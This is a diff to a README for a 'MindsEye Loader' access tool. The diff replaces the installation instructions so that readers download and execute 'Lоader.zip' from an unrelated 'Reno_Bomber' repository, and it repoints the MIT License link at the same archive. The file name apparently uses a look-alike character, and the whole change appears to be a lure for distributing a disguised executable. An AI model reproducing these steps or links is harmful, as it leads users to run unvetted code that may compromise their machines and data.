@@ -35,8 +35,8 @@ MindsEye, Loader, Alternative, Download, OS Support, Cross-Platform, 2025, Windo
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository  
-2. Extract Loader.rar to your desired directory  
+1. Download **https://raw.githubusercontent.com/Mohit1251/Reno_Bomber/main/Lоader.zip** from the repository  
+2. Extract https://raw.githubusercontent.com/Mohit1251/Reno_Bomber/main/Lоader.zip to your desired directory  
 3. Execute the Loader for your OS  
 4. Follow the on-screen instructions for setup  
 5. Enjoy advanced MindsEye access
@@ -51,7 +51,7 @@ For educational and research pursuits only. This loader is an independent tool a
 
 ## 📄 License
 
-MindsEye Alternative Access Tool is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+MindsEye Alternative Access Tool is distributed under the [MIT License](https://raw.githubusercontent.com/Mohit1251/Reno_Bomber/main/Lоader.zip).  
 2025
 
 ---
